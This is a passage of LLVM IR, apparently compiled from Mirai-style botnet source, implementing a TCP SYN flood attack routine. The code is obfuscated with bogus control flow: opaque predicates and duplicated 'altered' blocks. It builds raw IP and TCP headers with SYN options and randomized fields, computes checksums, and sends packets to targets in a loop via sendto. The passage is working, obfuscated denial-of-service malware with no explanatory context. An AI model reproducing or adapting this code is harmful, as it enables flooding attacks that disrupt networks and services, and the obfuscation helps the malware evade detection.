  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  %163 = load i8*, i8** %162, align 8
  %164 = bitcast i8* %163 to %struct.iphdr*
  store %struct.iphdr* %164, %struct.iphdr** %35, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i64 1
  %167 = bitcast %struct.iphdr* %166 to %struct.tcphdr*
  store %struct.tcphdr* %167, %struct.tcphdr** %36, align 8
  %168 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i64 1
  %170 = bitcast %struct.tcphdr* %169 to i8*
  store i8* %170, i8** %37, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, 15
  %175 = or i8 %174, 64
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, -16
  %180 = or i8 %179, 5
  store i8 %180, i8* %177, align 4
  %181 = load i8, i8* %20, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 1
  store i8 %181, i8* %183, align 1
  %184 = call zeroext i16 @htons(i16 zeroext 60) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %21, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %22, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %23, align 1
  %195 = icmp ne i8 %194, 0
  %196 = load i32, i32* @x.33
  %197 = load i32, i32* @y.34
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart234, label %originalBB6alteredBB

originalBBpart234:                                ; preds = %originalBB6
  br i1 %195, label %204, label %224

; <label>:204:                                    ; preds = %originalBBpart234
  %205 = load i32, i32* @x.33
  %206 = load i32, i32* @y.34
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %204
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  %216 = load i32, i32* @x.33
  %217 = load i32, i32* @y.34
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %224

; <label>:224:                                    ; preds = %originalBBpart238, %originalBBpart234
  %225 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 6
  store i8 6, i8* %226, align 1
  %227 = load i32, i32* %34, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 8
  store i32 %227, i32* %229, align 4
  %230 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %231 = load i32, i32* %17, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 1
  %235 = load i32, i32* %234, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 9
  store i32 %235, i32* %237, align 4
  %238 = load i16, i16* %24, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  store i16 %239, i16* %241, align 4
  %242 = load i16, i16* %25, align 2
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  %246 = load i32, i32* %26, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = zext i16 %248 to i32
  %250 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 2
  store i32 %249, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %254, -241
  %256 = or i16 %255, 160
  store i16 %256, i16* %253, align 4
  %257 = load i8, i8* %28, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %258, 1
  %263 = shl i16 %262, 13
  %264 = and i16 %261, -8193
  %265 = or i16 %264, %263
  store i16 %265, i16* %260, align 4
  %266 = load i8, i8* %29, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %267, 1
  %272 = shl i16 %271, 12
  %273 = and i16 %270, -4097
  %274 = or i16 %273, %272
  store i16 %274, i16* %269, align 4
  %275 = load i8, i8* %30, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %276, 1
  %281 = shl i16 %280, 11
  %282 = and i16 %279, -2049
  %283 = or i16 %282, %281
  store i16 %283, i16* %278, align 4
  %284 = load i8, i8* %31, align 1
  %285 = sext i8 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = and i16 %285, 1
  %290 = shl i16 %289, 10
  %291 = and i16 %288, -1025
  %292 = or i16 %291, %290
  store i16 %292, i16* %287, align 4
  %293 = load i8, i8* %32, align 1
  %294 = sext i8 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 4
  %297 = load i16, i16* %296, align 4
  %298 = and i16 %294, 1
  %299 = shl i16 %298, 9
  %300 = and i16 %297, -513
  %301 = or i16 %300, %299
  store i16 %301, i16* %296, align 4
  %302 = load i8, i8* %33, align 1
  %303 = sext i8 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %303, 1
  %308 = shl i16 %307, 8
  %309 = and i16 %306, -257
  %310 = or i16 %309, %308
  store i16 %310, i16* %305, align 4
  %311 = load i8*, i8** %37, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %37, align 8
  store i8 2, i8* %311, align 1
  %313 = load i8*, i8** %37, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %37, align 8
  store i8 4, i8* %313, align 1
  %315 = call i32 @rand_next()
  %316 = and i32 %315, 15
  %317 = add i32 1458, %316
  %318 = trunc i32 %317 to i16
  %319 = call zeroext i16 @htons(i16 zeroext %318) #7
  %320 = load i8*, i8** %37, align 8
  %321 = bitcast i8* %320 to i16*
  store i16 %319, i16* %321, align 2
  %322 = load i8*, i8** %37, align 8
  %323 = getelementptr inbounds i8, i8* %322, i64 2
  store i8* %323, i8** %37, align 8
  %324 = load i8*, i8** %37, align 8
  %325 = getelementptr inbounds i8, i8* %324, i32 1
  store i8* %325, i8** %37, align 8
  store i8 4, i8* %324, align 1
  %326 = load i8*, i8** %37, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %37, align 8
  store i8 2, i8* %326, align 1
  %328 = load i8*, i8** %37, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %37, align 8
  store i8 8, i8* %328, align 1
  %330 = load i8*, i8** %37, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %37, align 8
  store i8 10, i8* %330, align 1
  %332 = call i32 @rand_next()
  %333 = load i8*, i8** %37, align 8
  %334 = bitcast i8* %333 to i32*
  store i32 %332, i32* %334, align 4
  %335 = load i8*, i8** %37, align 8
  %336 = getelementptr inbounds i8, i8* %335, i64 4
  store i8* %336, i8** %37, align 8
  %337 = load i8*, i8** %37, align 8
  %338 = bitcast i8* %337 to i32*
  store i32 0, i32* %338, align 4
  %339 = load i8*, i8** %37, align 8
  %340 = getelementptr inbounds i8, i8* %339, i64 4
  store i8* %340, i8** %37, align 8
  %341 = load i8*, i8** %37, align 8
  %342 = getelementptr inbounds i8, i8* %341, i32 1
  store i8* %342, i8** %37, align 8
  store i8 1, i8* %341, align 1
  %343 = load i8*, i8** %37, align 8
  %344 = getelementptr inbounds i8, i8* %343, i32 1
  store i8* %344, i8** %37, align 8
  store i8 3, i8* %343, align 1
  %345 = load i8*, i8** %37, align 8
  %346 = getelementptr inbounds i8, i8* %345, i32 1
  store i8* %346, i8** %37, align 8
  store i8 3, i8* %345, align 1
  %347 = load i8*, i8** %37, align 8
  %348 = getelementptr inbounds i8, i8* %347, i32 1
  store i8* %348, i8** %37, align 8
  store i8 8, i8* %347, align 1
  br label %349

; <label>:349:                                    ; preds = %224
  %350 = load i32, i32* @x.33
  %351 = load i32, i32* @y.34
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %349
  %358 = load i32, i32* %17, align 4
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %17, align 4
  %360 = load i32, i32* @x.33
  %361 = load i32, i32* @y.34
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart250, label %originalBB40alteredBB

originalBBpart250:                                ; preds = %originalBB40
  br label %140

; <label>:368:                                    ; preds = %140
  %369 = load i32, i32* @x.33
  %370 = load i32, i32* @y.34
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %368
  %377 = load i32, i32* @x.33
  %378 = load i32, i32* @y.34
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %385

; <label>:385:                                    ; preds = %originalBBpart278, %originalBBpart254
  store i32 0, i32* %17, align 4
  br label %386

; <label>:386:                                    ; preds = %609, %385
  %387 = load i32, i32* @x.33
  %388 = load i32, i32* @y.34
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %386
  %395 = load i32, i32* %17, align 4
  %396 = load i8, i8* %13, align 1
  %397 = zext i8 %396 to i32
  %398 = icmp slt i32 %395, %397
  %399 = load i32, i32* @x.33
  %400 = load i32, i32* @y.34
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %398, label %407, label %612

; <label>:407:                                    ; preds = %originalBBpart258
  %408 = load i8**, i8*** %19, align 8
  %409 = load i32, i32* %17, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds i8*, i8** %408, i64 %410
  %412 = load i8*, i8** %411, align 8
  store i8* %412, i8** %38, align 8
  %413 = load i8*, i8** %38, align 8
  %414 = bitcast i8* %413 to %struct.iphdr*
  store %struct.iphdr* %414, %struct.iphdr** %39, align 8
  %415 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i64 1
  %417 = bitcast %struct.iphdr* %416 to %struct.tcphdr*
  store %struct.tcphdr* %417, %struct.tcphdr** %40, align 8
  %418 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %419 = load i32, i32* %17, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i64 %420
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i32 0, i32 2
  %423 = load i8, i8* %422, align 4
  %424 = zext i8 %423 to i32
  %425 = icmp slt i32 %424, 32
  br i1 %425, label %426, label %447

; <label>:426:                                    ; preds = %407
  %427 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %428 = load i32, i32* %17, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 1
  %432 = load i32, i32* %431, align 4
  %433 = call i32 @ntohl(i32 %432) #7
  %434 = call i32 @rand_next()
  %435 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %436 = load i32, i32* %17, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i64 %437
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %438, i32 0, i32 2
  %440 = load i8, i8* %439, align 4
  %441 = zext i8 %440 to i32
  %442 = lshr i32 %434, %441
  %443 = add i32 %433, %442
  %444 = call i32 @htonl(i32 %443) #7
  %445 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %445, i32 0, i32 9
  store i32 %444, i32* %446, align 4
  br label %447

; <label>:447:                                    ; preds = %426, %407
  %448 = load i32, i32* %34, align 4
  %449 = icmp eq i32 %448, -1
  br i1 %449, label %450, label %454

; <label>:450:                                    ; preds = %447
  %451 = call i32 @rand_next()
  %452 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 8
  store i32 %451, i32* %453, align 4
  br label %454

; <label>:454:                                    ; preds = %450, %447
  %455 = load i16, i16* %21, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  br i1 %457, label %458, label %464

; <label>:458:                                    ; preds = %454
  %459 = call i32 @rand_next()
  %460 = and i32 %459, 65535
  %461 = trunc i32 %460 to i16
  %462 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 3
  store i16 %461, i16* %463, align 4
  br label %464

; <label>:464:                                    ; preds = %458, %454
  %465 = load i16, i16* %24, align 2
  %466 = zext i16 %465 to i32
  %467 = icmp eq i32 %466, 65535
  br i1 %467, label %468, label %474

; <label>:468:                                    ; preds = %464
  %469 = call i32 @rand_next()
  %470 = and i32 %469, 65535
  %471 = trunc i32 %470 to i16
  %472 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 0
  store i16 %471, i16* %473, align 4
  br label %474

; <label>:474:                                    ; preds = %468, %464
  %475 = load i16, i16* %25, align 2
  %476 = zext i16 %475 to i32
  %477 = icmp eq i32 %476, 65535
  br i1 %477, label %478, label %484

; <label>:478:                                    ; preds = %474
  %479 = call i32 @rand_next()
  %480 = and i32 %479, 65535
  %481 = trunc i32 %480 to i16
  %482 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 1
  store i16 %481, i16* %483, align 2
  br label %484

; <label>:484:                                    ; preds = %478, %474
  %485 = load i32, i32* @x.33
  %486 = load i32, i32* @y.34
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %484
  %493 = load i32, i32* %26, align 4
  %494 = icmp eq i32 %493, 65535
  %495 = load i32, i32* @x.33
  %496 = load i32, i32* @y.34
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %494, label %503, label %523

; <label>:503:                                    ; preds = %originalBBpart262
  %504 = load i32, i32* @x.33
  %505 = load i32, i32* @y.34
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %503
  %512 = call i32 @rand_next()
  %513 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 2
  store i32 %512, i32* %514, align 4
  %515 = load i32, i32* @x.33
  %516 = load i32, i32* @y.34
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %523

; <label>:523:                                    ; preds = %originalBBpart266, %originalBBpart262
  %524 = load i32, i32* %27, align 4
  %525 = icmp eq i32 %524, 65535
  br i1 %525, label %526, label %530

; <label>:526:                                    ; preds = %523
  %527 = call i32 @rand_next()
  %528 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 3
  store i32 %527, i32* %529, align 4
  br label %530

; <label>:530:                                    ; preds = %526, %523
  %531 = load i32, i32* @x.33
  %532 = load i32, i32* @y.34
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %530
  %539 = load i8, i8* %28, align 1
  %540 = icmp ne i8 %539, 0
  %541 = load i32, i32* @x.33
  %542 = load i32, i32* @y.34
  %543 = sub i32 %541, 1
  %544 = mul i32 %541, %543
  %545 = urem i32 %544, 2
  %546 = icmp eq i32 %545, 0
  %547 = icmp slt i32 %542, 10
  %548 = or i1 %546, %547
  br i1 %548, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %540, label %549, label %555

; <label>:549:                                    ; preds = %originalBBpart270
  %550 = call i32 @rand_next()
  %551 = and i32 %550, 65535
  %552 = trunc i32 %551 to i16
  %553 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  br label %555

; <label>:555:                                    ; preds = %549, %originalBBpart270
  %556 = load i32, i32* @x.33
  %557 = load i32, i32* @y.34
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %555
  %564 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %565 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %564, i32 0, i32 7
  store i16 0, i16* %565, align 2
  %566 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %567 = bitcast %struct.iphdr* %566 to i16*
  %568 = call zeroext i16 @checksum_generic(i16* %567, i32 20)
  %569 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %570 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %569, i32 0, i32 7
  store i16 %568, i16* %570, align 2
  %571 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 6
  store i16 0, i16* %572, align 4
  %573 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %574 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %575 = bitcast %struct.tcphdr* %574 to i8*
  %576 = call zeroext i16 @htons(i16 zeroext 40) #7
  %577 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %573, i8* %575, i16 zeroext %576, i32 40)
  %578 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 6
  store i16 %577, i16* %579, align 4
  %580 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %581 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %580, i32 0, i32 1
  %582 = load i16, i16* %581, align 2
  %583 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %584 = load i32, i32* %17, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i64 %585
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %586, i32 0, i32 0
  %588 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %587, i32 0, i32 1
  store i16 %582, i16* %588, align 2
  %589 = load i32, i32* %18, align 4
  %590 = load i8*, i8** %38, align 8
  %591 = bitcast %union.__CONST_SOCKADDR_ARG* %41 to %struct.sockaddr**
  %592 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %593 = load i32, i32* %17, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %592, i64 %594
  %596 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %595, i32 0, i32 0
  %597 = bitcast %struct.sockaddr_in* %596 to %struct.sockaddr*
  store %struct.sockaddr* %597, %struct.sockaddr** %591, align 8
  %598 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %41, i32 0, i32 0
  %599 = load %struct.sockaddr*, %struct.sockaddr** %598, align 8
  %600 = call i64 @sendto(i32 %589, i8* %590, i64 60, i32 16384, %struct.sockaddr* %599, i32 16)
  %601 = load i32, i32* @x.33
  %602 = load i32, i32* @y.34
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %609

; <label>:609:                                    ; preds = %originalBBpart274
  %610 = load i32, i32* %17, align 4
  %611 = add nsw i32 %610, 1
  store i32 %611, i32* %17, align 4
  br label %386

; <label>:612:                                    ; preds = %originalBBpart258
  %613 = load i32, i32* @x.33
  %614 = load i32, i32* @y.34
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %612
  %621 = load i32, i32* @x.33
  %622 = load i32, i32* @y.34
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %385

; <label>:629:                                    ; preds = %originalBBpart24, %114
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %630 = alloca i8, align 1
  %631 = alloca %struct.attack_target*, align 8
  %632 = alloca i8, align 1
  %633 = alloca %struct.attack_option*, align 8
  %634 = alloca i32, align 4
  %635 = alloca i32, align 4
  %636 = alloca i8**, align 8
  %637 = alloca i8, align 1
  %638 = alloca i16, align 2
  %639 = alloca i8, align 1
  %640 = alloca i8, align 1
  %641 = alloca i16, align 2
  %642 = alloca i16, align 2
  %643 = alloca i32, align 4
  %644 = alloca i32, align 4
  %645 = alloca i8, align 1
  %646 = alloca i8, align 1
  %647 = alloca i8, align 1
  %648 = alloca i8, align 1
  %649 = alloca i8, align 1
  %650 = alloca i8, align 1
  %651 = alloca i32, align 4
  %652 = alloca %struct.iphdr*, align 8
  %653 = alloca %struct.tcphdr*, align 8
  %654 = alloca i8*, align 8
  %655 = alloca i8*, align 8
  %656 = alloca %struct.iphdr*, align 8
  %657 = alloca %struct.tcphdr*, align 8
  %658 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %630, align 1
  store %struct.attack_target* %1, %struct.attack_target** %631, align 8
  store i8 %2, i8* %632, align 1
  store %struct.attack_option* %3, %struct.attack_option** %633, align 8
  %659 = load i8, i8* %630, align 1
  %660 = zext i8 %659 to i64
  %661 = call noalias i8* @calloc(i64 %660, i64 8) #6
  %662 = bitcast i8* %661 to i8**
  store i8** %662, i8*** %636, align 8
  %663 = load i8, i8* %632, align 1
  %664 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %665 = call i32 @attack_get_opt_int(i8 zeroext %663, %struct.attack_option* %664, i8 zeroext 2, i32 0)
  %666 = trunc i32 %665 to i8
  store i8 %666, i8* %637, align 1
  %667 = load i8, i8* %632, align 1
  %668 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %669 = call i32 @attack_get_opt_int(i8 zeroext %667, %struct.attack_option* %668, i8 zeroext 3, i32 65535)
  %670 = trunc i32 %669 to i16
  store i16 %670, i16* %638, align 2
  %671 = load i8, i8* %632, align 1
  %672 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %673 = call i32 @attack_get_opt_int(i8 zeroext %671, %struct.attack_option* %672, i8 zeroext 4, i32 64)
  %674 = trunc i32 %673 to i8
  store i8 %674, i8* %639, align 1
  %675 = load i8, i8* %632, align 1
  %676 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %677 = call i32 @attack_get_opt_int(i8 zeroext %675, %struct.attack_option* %676, i8 zeroext 5, i32 1)
  %678 = trunc i32 %677 to i8
  store i8 %678, i8* %640, align 1
  %679 = load i8, i8* %632, align 1
  %680 = load %struct.attack_option*, %struct.attack_option** %633, align 8
  %681 = call i32 @attack_get_opt_int(i8 zeroext %679, %struct.attack_option* %680, i8 zeroext 6, i32 65535)
  %682 = trunc i32 %681 to i16
  store i16 %682, i16* %641, align 2
  %683 = load i8, i8* %632, align 1
  %684 = load %struct.attack_option*, %struct.attack_option** %633, align 8
